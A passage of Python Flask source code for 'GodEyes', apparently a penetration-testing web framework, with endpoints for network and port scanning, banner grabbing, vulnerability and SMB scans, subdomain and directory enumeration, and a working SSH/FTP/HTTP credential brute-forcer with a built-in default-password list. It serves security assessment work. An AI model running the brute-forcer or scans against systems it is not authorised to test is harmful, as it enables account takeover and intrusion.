            .stamp {{ border:2px solid #ff3b5c; color:#ff3b5c; padding:5px 15px; font-weight:bold; letter-spacing:2px; transform:rotate(-5deg); font-family:monospace; font-size:24px; }}
            .meta {{ font-family:monospace; font-size:14px; color:#4a5c76; }}
            .block {{ background:#141c27; border:1px solid #1a2535; border-radius:8px; padding:20px; margin-bottom:20px; font-family:monospace; font-size:13px; overflow-x:auto; }}
            .level-error {{ color:#ff3b5c; }}
            .level-warn {{ color:#ff8a00; }}
            .level-success {{ color:#00f5a0; }}
            .level-info {{ color:#a1aab6; }}
            .line {{ display:block; white-space:pre-wrap; }}
        </style>
    </head>
    <body>
        <div class="header">
            <div>
                <h1>GODEYES FORENSIC REPORT</h1>
                <div class="meta">ALVO: {target}</div>
                <div class="meta">DATA DE GERAÇÃO: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</div>
                <div class="meta">TOTAL DE OPERAÇÕES ATACANTES: {len(history)}</div>
            </div>
            <div class="stamp">CONFIDENTIAL</div>
        </div>
        
        <h2>Resumo Executivo</h2>
        <p>Este documento contém o registro bruto de ferramentas cibernéticas executadas em prol de validar a segurança perimetral e interna do alvo <strong>{target}</strong>. Todas as ações foram geradas automaticamente pelo framework GodEyes.</p>
    """
    
    for h in reversed(history):
        html += f"""<h2>Operação: {h['job']} ({h['ts']})</h2><div class="block">"""
        for ln in h['log']:
            html += f"""<span class="line level-{ln['l']}">[{ln['t']}] {ln['m']}</span>"""
        html += "</div>"
        
    html += "</body></html>"
    return html

# ════════════════════════════════════════
# NETWORK SCAN (nmap)
# ════════════════════════════════════════
@app.route("/api/scan/start", methods=["POST"])
def api_scan_start():
    if scan_state["running"]:
        return jsonify({"error":"Scan em execução"}), 409
    data    = request.get_json(silent=True) or {}
    target  = data.get("target","192.168.1.0/24")
    stype   = data.get("type","standard")
    ports   = data.get("ports","21-23,25,53,80,110,135,139,143,161,443,445,1433,3306,3389,5432,5900,6379,8080,8443,27017")
    threading.Thread(target=_run_scan, args=(target,stype,ports), daemon=True).start()
    return jsonify({"status":"started","target":target})

@app.route("/api/scan/status")
def api_scan_status():  return jsonify(scan_state)

@app.route("/api/scan/results")
def api_scan_results(): return jsonify({"devices":scan_results,"count":len(scan_results)})

@app.route("/api/scan/history")
def api_scan_history(): return jsonify({"history":scan_history})

@app.route("/api/scan/cancel", methods=["POST"])
def api_scan_cancel():
    scan_state["running"] = False
    scan_state["message"] = "Cancelado"
    return jsonify({"ok":True})

def _run_scan(target, stype, ports):
    global scan_results
    scan_state.update({"running":True,"progress":5,"message":f"Iniciando scan em {target}...","started":datetime.datetime.now().isoformat(),"finished":None})
    scan_results = []
    try:
        if NMAP_OK:
            try:
                _nmap_scan(target, stype, ports)
            except Exception as e:
                print(f"Nmap falhou: {e}. Usando fallback de socket.")
                _socket_scan(target, ports)
        else:
            _socket_scan(target, ports)
        scan_history.insert(0,{"ts":datetime.datetime.now().isoformat(),"target":target,"type":stype,
            "total":len(scan_results),"high":sum(1 for d in scan_results if d["risk"]=="high"),
            "medium":sum(1 for d in scan_results if d["risk"]=="medium"),
            "low":sum(1 for d in scan_results if d["risk"]=="low")})
        if len(scan_history)>20: scan_history.pop()
    except Exception as e:
        scan_state["message"] = f"Erro: {e}"
    finally:
        scan_state.update({"running":False,"progress":100,"finished":datetime.datetime.now().isoformat(),
            "message":f"Concluído – {len(scan_results)} dispositivos"})

def _nmap_scan(target, stype, ports):
    nm   = nmap.PortScanner()
    args = {"fast":"-sn --host-timeout 10s",
            "standard":f"-sV -p {ports} --host-timeout 30s",
            "deep":f"-sV -sC -p {ports} --host-timeout 60s -O",
            "vuln":f"-sV -sC --script=vuln -p {ports} --host-timeout 120s"}.get(stype, f"-sV -p {ports} --host-timeout 30s")
    
    # Inject Proxy into NMAP arguments if applicable (HTTP/SOCKS4 proxies)
    if current_proxy and ("http://" in current_proxy or "socks4://" in current_proxy):
        args += f" --proxies {current_proxy}"

    scan_state["message"] = "Ping sweep..."
    nm_p = nmap.PortScanner()
    nm_p.scan(hosts=target, arguments="-sn --host-timeout 10s")
    live = [h for h in nm_p.all_hosts() if nm_p[h].state()=="up"]
    scan_state.update({"progress":25,"message":f"{len(live)} hosts ativos – escaneando..."})
    hosts_str = " ".join(live) if live else target
    nm.scan(hosts=hosts_str, arguments=args)
    all_h = nm.all_hosts()
    for i, host in enumerate(all_h):
        scan_state.update({"progress":25+int(i/max(len(all_h),1)*70),"message":f"Analisando {host} ({i+1}/{len(all_h)})"})
        if nm[host].state() != "up": continue
        scan_results.append(_parse_nmap(host, nm))

def _parse_nmap(ip, nm):
    hd = nm[ip]
    try: hostname = socket.gethostbyaddr(ip)[0]
    except: hostname = hd.hostname() or ip
    os_name = "Desconhecido"
    try:
        if hd.get("osmatch"): os_name = hd["osmatch"][0]["name"]
    except: pass
    open_ports=[]; services=[]; vulns=[]
    for proto in hd.all_protocols():
        for port in sorted(hd[proto].keys()):
            pi = hd[proto][port]
            if pi["state"]=="open":
                open_ports.append(port)
                services.append({"port":port,"name":pi.get("name","?"),"product":pi.get("product",""),"version":pi.get("version",""),"state":"open"})
                for v in get_cves(port):
                    if v["id"] not in [x["id"] for x in vulns]: vulns.append(v)
                for sname,out in pi.get("script",{}).items():
                    for cve in re.findall(r'CVE-\d{4}-\d+', out):
                        if cve not in [x["id"] for x in vulns]:
                            vulns.append({"id":cve,"desc":f"Script {sname}","cvss":7.0,"sev":"high"})
    mac = hd.get("addresses",{}).get("mac","–")
    vendor = list(hd.get("vendor",{}).values())[0] if hd.get("vendor") else "–"
    return {"ip":ip,"hostname":hostname,"mac":mac,"vendor":vendor,"os":os_name,
            "risk":calc_risk(open_ports,vulns),"ports":open_ports,"services":services,"vulns":vulns,"uptime":"–"}

def _socket_scan(target, ports_str):
    import concurrent.futures
    try: hosts = list(ipaddress.ip_network(target,strict=False).hosts())[:254]
    except: hosts = [ipaddress.ip_address(target)]
    plist = [int(p) for p in re.findall(r'\d+', ports_str)]
    
    total = len(hosts)
    completed = 0
    
    def check_host(host_obj):
        ip = str(host_obj)
        open_ports = []
        for port in plist:
            try:
                s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.3)
                r=s.connect_ex((ip,port))
                s.close()
                if r==0: open_ports.append(port)
            except: pass
        if not open_ports:
            return None
        
        try: hostname=socket.gethostbyaddr(ip)[0]
        except: hostname=ip
        vulns=[v for p in open_ports for v in get_cves(p)]
        services=[{"port":p,"name":PORT_NAMES.get(p,"?"),"product":"","version":"","state":"open"} for p in open_ports]
        return {"ip":ip,"hostname":hostname,"mac":"–","vendor":"–","os":"Desconhecido",
                "risk":calc_risk(open_ports,vulns),"ports":open_ports,"services":services,"vulns":vulns,"uptime":"–"}

    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
        futures = {executor.submit(check_host, h): h for h in hosts}
        for future in concurrent.futures.as_completed(futures):
            completed += 1
            if completed % 5 == 0:  # Update state every 5 hosts
                scan_state.update({"progress":int(completed/total*90),"message":f"Scanning network... ({completed}/{total})"})
            res = future.result()
            if res:
                scan_results.append(res)

# ════════════════════════════════════════
# PING
# ════════════════════════════════════════
@app.route("/api/ping", methods=["POST"])
def api_ping():
    data  = request.get_json(silent=True) or {}
    host  = data.get("host","").strip()
    count = min(int(data.get("count",4)), 20)
    if not host: return jsonify({"error":"host required"}), 400
    jid = new_job()
    threading.Thread(target=_run_ping, args=(jid,host,count), daemon=True).start()
    return jsonify({"job_id":jid})

def _run_ping(jid, host, count):
    job_append(jid, f"PING {host} ({count} pacotes)...", "info")
    try:
        cmd = ["ping","-n",str(count),host] if os.name=="nt" else ["ping","-c",str(count),host]
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        for line in proc.stdout:
            line = line.rstrip()
            if line:
                lvl = "success" if "TTL" in line or "bytes from" in line.lower() else \
                      "error"   if "timeout" in line.lower() or "unreachable" in line.lower() else "info"
                job_append(jid, line, lvl)
        proc.wait()
        job_append(jid, "Ping concluído.", "success" if proc.returncode==0 else "error")
    except Exception as e:
        job_append(jid, f"Erro: {e}", "error")
    job_done(jid, target=host)

# ════════════════════════════════════════
# TRACEROUTE
# ════════════════════════════════════════
@app.route("/api/traceroute/job", methods=["POST"])
def api_traceroute_job():
    data = request.get_json(silent=True) or {}
    host = data.get("host","").strip()
    if not host: return jsonify({"error":"host required"}), 400
    jid = new_job()
    threading.Thread(target=_run_traceroute, args=(jid,host), daemon=True).start()
    return jsonify({"job_id":jid})

def _run_traceroute(jid, host):
    job_append(jid, f"Traceroute para {host}...", "info")
    try:
        cmd = ["tracert","-d","-w","500",host] if os.name=="nt" else ["traceroute","-n",host]
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        for line in proc.stdout:
            line = line.rstrip()
            if line:
                lvl = "success" if re.search(r'\d+\.\d+\.\d+\.\d+', line) else "info"
                job_append(jid, line, lvl)
        proc.wait()
        job_append(jid, "Traceroute concluído.", "info")
    except Exception as e:
        job_append(jid, f"Erro: {e}", "error")
    job_done(jid, target=host)

# ════════════════════════════════════════
# BANNER GRAB
# ════════════════════════════════════════
@app.route("/api/banner", methods=["POST"])
def api_banner():
    data = request.get_json(silent=True) or {}
    host = data.get("host","").strip()
    ports = data.get("ports",[21,22,23,25,80,110,443,8080])
    if not host: return jsonify({"error":"host required"}), 400
    jid = new_job()
    threading.Thread(target=_run_banner, args=(jid,host,ports), daemon=True).start()
    return jsonify({"job_id":jid})

def _run_banner(jid, host, ports):
    job_append(jid, f"Banner grab em {host}...", "info")
    for port in ports:
        try:
            s = socket.socket(); s.settimeout(3)
            s.connect((host, port))
            banner = ""
            # Send HTTP request for web ports
            if port in [80,8080,8443,443]:
                s.send(f"HEAD / HTTP/1.0\r\nHost:{host}\r\n\r\n".encode())
            try:
                banner = s.recv(1024).decode(errors="replace").strip()
            except: pass
            s.close()
            if banner:
                job_append(jid, f"[:{port}] {PORT_NAMES.get(port,'?').upper()} OPEN", "success")
                for ln in banner.split('\n')[:5]:
                    if ln.strip(): job_append(jid, f"  {ln.strip()}", "info")
            else:
                job_append(jid, f"[:{port}] Open (sem banner)", "success")
        except ConnectionRefusedError:
            job_append(jid, f"[:{port}] Fechada", "error")
        except Exception as e:
            job_append(jid, f"[:{port}] {e}", "error")
    job_append(jid, "Banner grab concluído.", "info")
    job_done(jid, target=host)

# ════════════════════════════════════════
# PORT SCAN (rápido via socket)
# ════════════════════════════════════════
@app.route("/api/portscan", methods=["POST"])
def api_portscan():
    data  = request.get_json(silent=True) or {}
    host  = data.get("host","").strip()
    start = int(data.get("start",1))
    end   = min(int(data.get("end",1024)), 65535)
    if not host: return jsonify({"error":"host required"}), 400
    jid = new_job()
    threading.Thread(target=_run_portscan, args=(jid,host,start,end), daemon=True).start()
    return jsonify({"job_id":jid})

def _run_portscan(jid, host, start, end):
    job_append(jid, f"Port scan {host} :{start}-{end} ...", "info")
    open_ports = []
    total = end - start + 1
    def scan_chunk(ports_chunk):
        for port in ports_chunk:
            try:
                s=socket.socket(); s.settimeout(0.5)
                if s.connect_ex((host,port))==0:
                    open_ports.append(port)
                s.close()
            except: pass
    # Thread pool
    chunk = 100
    threads = []
    for i in range(start, end+1, chunk):
        t = threading.Thread(target=scan_chunk, args=(range(i,min(i+chunk,end+1)),))
        threads.append(t); t.start()
    for t in threads: t.join()
    open_ports.sort()
    job_append(jid, f"Portas abertas encontradas: {len(open_ports)}", "success" if open_ports else "info")
    for port in open_ports:
        name = PORT_NAMES.get(port, "?")
        cvs  = get_cves(port)
        sev  = cvs[0]["sev"] if cvs else ""
        tag  = f" ⚠ CVE: {cvs[0]['id']} ({sev})" if cvs else ""
        job_append(jid, f"  :{port}/tcp  OPEN  {name.upper()}{tag}", "success" if not cvs else "error")
    job_done(jid, target=host)

# ════════════════════════════════════════
# BRUTE FORCE
# ════════════════════════════════════════
WORDLISTS = {
    "user": ["admin","root","administrator","user","test","guest","vagrant","pi","ubuntu","oracle","sa","postgres"],
    "pass": ["admin","password","123456","admin123","root","pass","1234","toor","raspberry","letmein","qwerty","P@ssw0rd","changeme","postgres","oracle","sa","123",""]
}

@app.route("/api/brute", methods=["POST"])
def api_brute():
    data    = request.get_json(silent=True) or {}
    host    = data.get("host","").strip()
    port    = int(data.get("port",22))
    service = data.get("service","ssh")
    users   = data.get("users", WORDLISTS["user"])
    passwds = data.get("passwords", WORDLISTS["pass"])
    if not host: return jsonify({"error":"host required"}), 400
    jid = new_job()
    threading.Thread(target=_run_brute, args=(jid,host,port,service,users,passwds), daemon=True).start()
    return jsonify({"job_id":jid})

def _run_brute(jid, host, port, service, users, passwds):
    job_append(jid, f"Brute force {service.upper()} {host}:{port}", "info")
    job_append(jid, f"Usuários: {len(users)} | Senhas: {len(passwds)} | Total: {len(users)*len(passwds)} combinações", "info")
    found = []
    stop = [False]

    if service.lower() == "ssh":
        if not PARAMIKO_OK:
            job_append(jid, "ERRO: paramiko não instalado. Execute: pip install paramiko", "error")
            job_done(jid); return
        for user in users:
            if stop[0]: break
            for pwd in passwds:
                if stop[0]: break
                try:
                    cl = paramiko.SSHClient()
                    cl.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    cl.connect(host, port=port, username=user, password=pwd, timeout=4, banner_timeout=8, auth_timeout=6)
                    job_append(jid, f"✅ CREDENCIAL ENCONTRADA: {user}:{pwd}", "success")
                    found.append({"user":user,"pass":pwd})
                    cl.close(); stop[0] = True
                except paramiko.AuthenticationException:
                    job_append(jid, f"  ✗ {user}:{pwd}", "error")
                except Exception as e:
                    job_append(jid, f"  Erro de conexão: {e}", "error"); stop[0]=True

    elif service.lower() == "ftp":
        for user in users:
            if stop[0]: break
            for pwd in passwds:
                if stop[0]: break
                try:
                    f = ftplib.FTP(); f.connect(host, port, timeout=4)
                    f.login(user, pwd)
                    job_append(jid, f"✅ FTP CREDENCIAL: {user}:{pwd}", "success")
                    found.append({"user":user,"pass":pwd})
                    f.quit(); stop[0]=True
                except ftplib.error_perm:
                    job_append(jid, f"  ✗ {user}:{pwd}", "error")
                except Exception as e:
                    job_append(jid, f"  Erro: {e}", "error"); stop[0]=True

    elif service.lower() == "http":
        if not REQUESTS_OK:
            job_append(jid, "requests não instalado", "error"); job_done(jid); return
        url = f"http://{host}:{port}/"
        for user in users:
            if stop[0]: break
            for pwd in passwds:
                if stop[0]: break
                try:
                    r = req_lib.get(url, auth=(user,pwd), timeout=4, verify=False, proxies=get_requests_proxies())
                    if r.status_code in [200,301,302,403]:
                        job_append(jid, f"✅ HTTP AUTH: {user}:{pwd} (status {r.status_code})", "success")
                        found.append({"user":user,"pass":pwd}); stop[0]=True
                    else:
                        job_append(jid, f"  ✗ {user}:{pwd} ({r.status_code})", "error")
                except Exception as e:
                    job_append(jid, f"  Erro: {e}", "error"); stop[0]=True

    if not found:
        job_append(jid, "Nenhuma credencial encontrada no wordlist padrão.", "info")
        job_append(jid, "Tente adicionar senhas customizadas se souber a política da empresa.", "info")
    else:
        job_append(jid, f"Total encontrado: {len(found)}", "success")
    job_done(jid)

# ════════════════════════════════════════
# SSL / TLS ANALYSIS
# ════════════════════════════════════════
@app.route("/api/ssl", methods=["POST"])
def api_ssl():
    data = request.get_json(silent=True) or {}
    host = data.get("host","").strip()
    port = int(data.get("port",443))
    if not host: return jsonify({"error":"host required"}), 400
    jid = new_job()
    threading.Thread(target=_run_ssl, args=(jid,host,port), daemon=True).start()
    return jsonify({"job_id":jid})

def _run_ssl(jid, host, port):
    job_append(jid, f"Analisando SSL/TLS em {host}:{port}...", "info")
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
        with ctx.wrap_socket(socket.socket(), server_hostname=host) as s:
            s.settimeout(8); s.connect((host, port))
            ver    = s.version()
            cipher = s.cipher()
            cert   = s.getpeercert()

        job_append(jid, f"✅ Conectado: {ver}", "success")
        job_append(jid, f"   Cipher: {cipher[0]}  KeyBits: {cipher[2]}", "info")

        if cert:
            subj  = dict(x[0] for x in cert.get("subject",[]))
            iss   = dict(x[0] for x in cert.get("issuer",[]))
            expdt = cert.get("notAfter","?")
            job_append(jid, f"   CN: {subj.get('commonName','?')}", "info")
            job_append(jid, f"   Issuer: {iss.get('organizationName','?')}", "info")
            job_append(jid, f"   Expira: {expdt}", "info")
            # Check expiry
            try:
                exp = datetime.datetime.strptime(expdt, "%b %d %H:%M:%S %Y %Z")
                days = (exp - datetime.datetime.utcnow()).days
                if days < 0:
                    job_append(jid, f"⚠ CERTIFICADO EXPIRADO há {-days} dias!", "error")
                elif days < 30:
                    job_append(jid, f"⚠ Certificado expira em {days} dias", "error")
                else:
                    job_append(jid, f"   Válido por {days} dias", "success")
            except: pass
            # SANs
            sans = [v for t,v in cert.get("subjectAltName",[]) if t=="DNS"]
            if sans: job_append(jid, f"   SANs: {', '.join(sans[:6])}", "info")

        # Check weak protocols
        for proto in [ssl.PROTOCOL_TLSv1, ssl.PROTOCOL_TLSv1_1] if hasattr(ssl,"PROTOCOL_TLSv1") else []:
            try:
                c2 = ssl.SSLContext(proto); c2.verify_mode=ssl.CERT_NONE
                with c2.wrap_socket(socket.socket()) as s2:
                    s2.settimeout(4); s2.connect((host,port))
                job_append(jid, f"⚠ Protocolo FRACO aceito: {ssl.get_protocol_name(proto)}", "error")
            except: pass

    except Exception as e:
        job_append(jid, f"Erro SSL: {e}", "error")
    job_done(jid)

# ════════════════════════════════════════
# HTTP HEADERS
# ════════════════════════════════════════
@app.route("/api/http-headers", methods=["POST"])
def api_http_headers():
    data = request.get_json(silent=True) or {}
    url  = data.get("url","").strip()
    if not url: return jsonify({"error":"url required"}), 400
    if not url.startswith("http"): url = "http://" + url
    jid = new_job()
    threading.Thread(target=_run_http_headers, args=(jid,url), daemon=True).start()
    return jsonify({"job_id":jid})

def _run_http_headers(jid, url):
    job_append(jid, f"Analisando headers HTTP: {url}", "info")
    if not REQUESTS_OK:
        job_append(jid, "requests não instalado: pip install requests","error"); job_done(jid); return
    try:
        import warnings; warnings.filterwarnings("ignore")
        for method in ["GET","HEAD"]:
            try:
                r = req_lib.request(method, url, timeout=10, verify=False,
                    headers={"User-Agent":"GodEyes/2.0 Security Scanner"}, allow_redirects=True, proxies=get_requests_proxies())
                job_append(jid, f"HTTP {method} → {r.status_code} {r.reason}", "success" if r.ok else "error")
                job_append(jid, f"URL final: {r.url}", "info")
                job_append(jid, "── Headers ──────────────────────────", "info")
                for k,v in r.headers.items():
                    job_append(jid, f"  {k}: {v}", "info")

                # Security header checks
                job_append(jid, "── Segurança ─────────────────────────", "info")
                SECURITY_HEADERS = {
                    "Strict-Transport-Security": "HSTS",
                    "Content-Security-Policy": "CSP",
                    "X-Frame-Options": "Clickjacking protection",
                    "X-Content-Type-Options": "MIME sniffing protection",
                    "X-XSS-Protection": "XSS Protection",
                    "Referrer-Policy": "Referrer Policy",
                    "Permissions-Policy": "Permissions Policy",
                }
                for hdr, lbl in SECURITY_HEADERS.items():
                    if hdr in r.headers:
                        job_append(jid, f"  ✅ {lbl}: {r.headers[hdr][:60]}", "success")
                    else:
                        job_append(jid, f"  ⚠  {lbl} AUSENTE ({hdr})", "error")

                # Server fingerprint
                srv = r.headers.get("Server","")
                if srv: job_append(jid, f"  🖥 Server: {srv} (revelar versão é má prática)", "error" if re.search(r'\d',srv) else "info")
                powered = r.headers.get("X-Powered-By","")
                if powered: job_append(jid, f"  🔍 X-Powered-By: {powered} (informação sensível!)", "error")
                break
            except Exception: continue
    except Exception as e:
        job_append(jid, f"Erro: {e}", "error")
    job_done(jid)

# ════════════════════════════════════════
# DNS LOOKUP
# ════════════════════════════════════════
@app.route("/api/dns", methods=["POST"])
def api_dns():
    data = request.get_json(silent=True) or {}
    host = data.get("host","").strip()
    if not host: return jsonify({"error":"host required"}), 400
    jid = new_job()
    threading.Thread(target=_run_dns, args=(jid,host), daemon=True).start()
    return jsonify({"job_id":jid})

def _run_dns(jid, host):
    job_append(jid, f"DNS Lookup: {host}", "info")
    records = ["A","AAAA","MX","NS","TXT","CNAME","SOA"]
    if DNS_OK:
        resolver = dns.resolver.Resolver()
        resolver.timeout = 4; resolver.lifetime = 8
        for rtype in records:
            try:
                ans = resolver.resolve(host, rtype)
                for r in ans:
                    job_append(jid, f"  {rtype:6} {r.to_text()}", "success")
            except Exception as e:
                job_append(jid, f"  {rtype:6} No data", "info")
    else:
        try:
            ip = socket.gethostbyname(host)
            job_append(jid, f"  A      {ip}", "success")
        except Exception as e:
            job_append(jid, f"  Erro: {e}", "error")
    # Reverse DNS
    try:
        ip  = socket.gethostbyname(host)
        rev = socket.gethostbyaddr(ip)
        job_append(jid, f"  PTR    {rev[0]}", "info")
    except: pass
    # Check DNS over common resolvers
    job_append(jid, "── Resolvers ──────────────────────────", "info")
    for resolver_ip, name in [("8.8.8.8","Google"),("1.1.1.1","Cloudflare"),("9.9.9.9","Quad9")]:
        try:
            if DNS_OK:
                r2 = dns.resolver.Resolver()
                r2.nameservers = [resolver_ip]; r2.timeout=3
                a = r2.resolve(host,"A"); result=str(a[0])
            else:
                result = socket.gethostbyname(host)
            job_append(jid, f"  {name:12} {resolver_ip}  →  {result}", "success")
        except Exception as e:
            job_append(jid, f"  {name:12} Erro: {e}", "error")
    job_done(jid)

# ════════════════════════════════════════
# WHOIS
# ════════════════════════════════════════
@app.route("/api/whois", methods=["POST"])
def api_whois():
    data = request.get_json(silent=True) or {}
    host = data.get("host","").strip()
    if not host: return jsonify({"error":"host required"}), 400
    jid = new_job()
    threading.Thread(target=_run_whois, args=(jid,host), daemon=True).start()
    return jsonify({"job_id":jid})

def _run_whois(jid, host):
    job_append(jid, f"WHOIS: {host}", "info")
    if WHOIS_OK:
        try:
            w = whois_lib.whois(host)
            fields = {"domain_name":"Domain","registrar":"Registrar","creation_date":"Criado",
                      "expiration_date":"Expira","updated_date":"Atualizado",
                      "name_servers":"Name Servers","emails":"Emails","country":"País",
                      "org":"Organização","address":"Endereço"}
            for k,label in fields.items():
                val = getattr(w,k,None)
                if val:
                    val_str = str(val[0] if isinstance(val,list) else val)[:80]
                    job_append(jid, f"  {label:15}{val_str}", "info")
        except Exception as e:
            job_append(jid, f"Erro WHOIS: {e}", "error")
    else:
        # Fallback: raw whois via socket
        try:
            s=socket.socket(); s.settimeout(10)
            s.connect(("whois.iana.org",43))
            s.send((host+"\r\n").encode())
            raw=b""
            while True:
                d=s.recv(4096)
                if not d: break
                raw+=d
            s.close()
            for ln in raw.decode(errors="replace").split('\n')[:30]:
                if ln.strip() and not ln.startswith("%"):
                    job_append(jid, f"  {ln.rstrip()}", "info")
        except Exception as e:
            job_append(jid, f"Erro: {e}. Instale: pip install python-whois", "error")
    job_done(jid)

# ════════════════════════════════════════
# ARP SCAN (rede local)
# ════════════════════════════════════════
@app.route("/api/arp", methods=["POST"])
def api_arp():
    data   = request.get_json(silent=True) or {}
    target = data.get("target","192.168.1.0/24")
    jid    = new_job()
    threading.Thread(target=_run_arp, args=(jid,target), daemon=True).start()
    return jsonify({"job_id":jid})

def _run_arp(jid, target):
    job_append(jid, f"ARP Scan: {target}", "info")
    # Try nmap ARP scan first
    if NMAP_OK:
        try:
            nm = nmap.PortScanner()
            nm.scan(hosts=target, arguments="-sn -PR --host-timeout 10s")
            found=0
            for host in nm.all_hosts():
                if nm[host].state()=="up":
                    mac  = nm[host].get("addresses",{}).get("mac","?")
                    vend = list(nm[host].get("vendor",{}).values())[0] if nm[host].get("vendor") else "?"
                    job_append(jid, f"  {host:18} MAC: {mac:18} {vend}", "success"); found+=1
            job_append(jid, f"Total: {found} hosts com ARP", "info")
            job_done(jid); return
        except: pass
    # Fallback: parse arp -a table
    try:
        cmd = ["arp","-a"] if os.name=="nt" else ["arp","-n"]
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        for line in r.stdout.split('\n'):
            if re.search(r'\d+\.\d+\.\d+\.\d+', line):
                job_append(jid, f"  {line.strip()}", "success")
        job_append(jid, "Tabela ARP local exibida.", "info")
    except Exception as e:
        job_append(jid, f"Erro: {e}", "error")
    job_done(jid)

# ════════════════════════════════════════
# OS FINGERPRINT (nmap -O)
# ════════════════════════════════════════
@app.route("/api/os-detect", methods=["POST"])
def api_os_detect():
    data = request.get_json(silent=True) or {}
    host = data.get("host","").strip()
    if not host: return jsonify({"error":"host required"}), 400
    jid = new_job()
    threading.Thread(target=_run_os, args=(jid,host), daemon=True).start()
    return jsonify({"job_id":jid})

def _run_os(jid, host):
    job_append(jid, f"OS Fingerprint: {host}...", "info")
    if not NMAP_OK:
        job_append(jid, "nmap não disponível", "error"); job_done(jid); return
    try:
        nm = nmap.PortScanner()
        nm.scan(host, arguments="-O --host-timeout 30s --osscan-guess")
        if nm[host].get("osmatch"):
            for m in nm[host]["osmatch"][:3]:
                job_append(jid, f"  {m['accuracy']}%  {m['name']}", "success")
                for cls in m.get("osclass",[]):
                    job_append(jid, f"       Tipo:{cls.get('type','?')} OS:{cls.get('osfamily','?')} Gen:{cls.get('osgen','?')}", "info")
        else:
            job_append(jid, "OS não detectado (pode precisar de root/admin para -O)", "error")
    except Exception as e:
        job_append(jid, f"Erro: {e}", "error")
    job_done(jid)

# ════════════════════════════════════════
# VULN SCAN (nmap --script=vuln)
# ════════════════════════════════════════
@app.route("/api/vulnscan", methods=["POST"])
def api_vulnscan():
    data  = request.get_json(silent=True) or {}
    host  = data.get("host","").strip()
    ports = data.get("ports","21-23,25,53,80,110,443,445,1433,3306,3389,5432,5900,8080")
    if not host: return jsonify({"error":"host required"}), 400
    jid = new_job()
    threading.Thread(target=_run_vulnscan, args=(jid,host,ports), daemon=True).start()
    return jsonify({"job_id":jid})

def _run_vulnscan(jid, host, ports):
    job_append(jid, f"Vuln Scan (nmap --script=vuln): {host}", "info")
    job_append(jid, "Isso pode levar 2-5 minutos...", "info")
    if not NMAP_OK:
        job_append(jid, "nmap necessário", "error"); job_done(jid); return
    try:
        nm = nmap.PortScanner()
        nm.scan(host, arguments=f"-sV -sC --script=vuln -p {ports} --host-timeout 180s")
        for h in nm.all_hosts():
            for proto in nm[h].all_protocols():
                for port in nm[h][proto]:
                    pi = nm[h][proto][port]
                    if pi["state"]=="open":
                        job_append(jid, f"  :{port}/tcp OPEN {pi.get('name','?')} {pi.get('product','')} {pi.get('version','')}", "success")
                        for sname, out in pi.get("script",{}).items():
                            if "VULNERABLE" in out.upper():
                                job_append(jid, f"  🔴 VULNERÁVEL [{sname}]:", "error")
                                for ln in out.split('\n')[:8]:
                                    if ln.strip(): job_append(jid, f"     {ln.strip()}", "error")
                            elif out.strip():
                                for ln in out.split('\n')[:3]:
                                    if ln.strip(): job_append(jid, f"     {ln.strip()}", "info")
    except Exception as e:
        job_append(jid, f"Erro: {e}", "error")
    job_done(jid)

# ════════════════════════════════════════
# SMB SCAN
# ════════════════════════════════════════
@app.route("/api/smb", methods=["POST"])
def api_smb():
    data = request.get_json(silent=True) or {}
    host = data.get("host","").strip()
    if not host: return jsonify({"error":"host required"}), 400
    jid = new_job()
    threading.Thread(target=_run_smb, args=(jid,host), daemon=True).start()
    return jsonify({"job_id":jid})

def _run_smb(jid, host):
    job_append(jid, f"SMB Scan: {host}", "info")
    if not NMAP_OK:
        job_append(jid, "nmap necessário", "error"); job_done(jid); return
    try:
        nm = nmap.PortScanner()
        nm.scan(host, arguments="--script=smb-security-mode,smb-vuln-ms17-010,smb-vuln-ms10-054,smb2-security-mode -p 139,445 --host-timeout 60s")
        for h in nm.all_hosts():
            for proto in nm[h].all_protocols():
                for port in nm[h][proto]:
                    pi = nm[h][proto][port]
                    if pi["state"]=="open":
                        job_append(jid, f"  :{port} SMB OPEN", "success")
                        for sname,out in pi.get("script",{}).items():
                            for ln in out.split('\n'):
                                if ln.strip():
                                    lvl = "error" if "VULNERABLE" in ln.upper() or "DANGEROUS" in ln.upper() else "info"
                                    job_append(jid, f"  [{sname}] {ln.strip()}", lvl)
    except Exception as e:
        job_append(jid, f"Erro: {e}", "error")
    job_done(jid)

# ════════════════════════════════════════
# SUBDOMAIN ENUMERATION (crt.sh)
# ════════════════════════════════════════
@app.route("/api/subdom", methods=["POST"])
def api_subdom():
    data = request.get_json(silent=True) or {}
    domain = data.get("domain", "").strip()
    if not domain: return jsonify({"error":"domain required"}), 400
    jid = new_job()
    threading.Thread(target=_run_subdom, args=(jid,domain), daemon=True).start()
    return jsonify({"job_id":jid})

def _run_subdom(jid, domain):
    job_append(jid, f"Enumerando subdomínios via crt.sh para: {domain}", "info")
    if not REQUESTS_OK:
        job_append(jid, "requests não instalado", "error"); job_done(jid); return
    try:
        url = f"https://crt.sh/?q=%.{domain}&output=json"
        r = req_lib.get(url, timeout=15)
        if r.status_code == 200:
            subs = set()
            for cert in r.json():
                name = cert.get("name_value", "")
                for s in name.split('\n'):
                    s = s.strip().lower()
                    if s and not s.startswith("*"): subs.add(s)
            
            subs = sorted(list(subs))
            job_append(jid, f"Encontrados {len(subs)} subdomínios nos logs de transparência:", "success")
            for sub in subs:
                job_append(jid, f"  [+] {sub}", "success")
                
            if not subs: job_append(jid, "Nenhum subdomínio encontrado.", "info")
        else:
            job_append(jid, f"Erro na API crt.sh (Status {r.status_code})", "error")
    except Exception as e:
        job_append(jid, f"Erro na enumeração de subdomínios: {e}", "error")
    job_done(jid)

# ════════════════════════════════════════
# DIRBUSTER (Directory Fuzzing)
# ════════════════════════════════════════
DIRBUSTER_WORDLIST = [
    "admin", "login", "dashboard", "wp-admin", "wp-login.php", 
    "backup", "backups", "db", "db_backup.sql", "database.sql",
    ".git", ".env", ".htaccess", "config.php", "config.bak", 
    "setup", "install", "api", "v1", "v2", "swagger", "docs",
